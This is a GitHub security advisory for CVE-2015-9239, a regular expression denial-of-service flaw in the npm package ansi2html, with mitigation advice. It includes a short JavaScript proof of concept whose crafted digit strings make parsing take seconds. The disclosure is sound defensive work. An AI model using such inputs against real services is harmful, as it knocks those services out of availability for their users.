# [H] Regular Expression Denial of Service in ansi2html

## Summary
Severity: High
Advisory: GHSA-c2v2-7rcg-2ch7
CVE: CVE-2015-9239
CWE: CWE-400
Ecosystem: npm
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-c2v2-7rcg-2ch7
Type: github-advisory

## Affected
- npm: `ansi2html` — affected >=0.0.0

## Details
The `ansi2html` package is affected by a regular expression denial of service vulnerability when certain types of user input is passed in.


## Proof of concept
```
var ansi2html = require('ansi2html')

var start = process.hrtime();
ansi2html("[1111111111111111111111;0000000000000000000000");
console.log(process.hrtime(start));

start = process.hrtime();
ansi2html("[1111111111111111111111;00000000000000000000000");
console.log(process.hrtime(start));

start = process.hrtime();
ansi2html("[1111111111111111111111;000000000000000000000000");
console.log(process.hrtime(start));

start = process.hrtime();
ansi2html("[1111111111111111111111;0000000000000000000000000000");
console.log(process.hrtime(start));
```

Results of the above
```
00:29:53-adam_baldwin~/tmp$ node test
[ 0, 119615367 ]
[ 0, 149934565 ]
[ 0, 233325677 ]
[ 3, 46582479 ]
```


## Recommendation

At the time of this writing, February 2018, all versions of `ansi2html` remain vulnerable, and the package has not been updated for 4 years. 

In order to use this package safely, it is necessary to avoid passing user input to the package, or to limit the size of the input string to a size with a parse time you find acceptable. Unfortunately, the match time grows at quite a small character count, so it is unlikely for it to both allow strings of a useful size while protecting against the denial of service attack. 

In the case that user input of significant length must be parsed by ansi2html, the best mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.][available on npm](https://www.npmjs.com/search?q=ansi+html)

## References
- https://nvd.nist.gov/vuln/detail/CVE-2015-9239
- https://www.npmjs.com/advisories/51
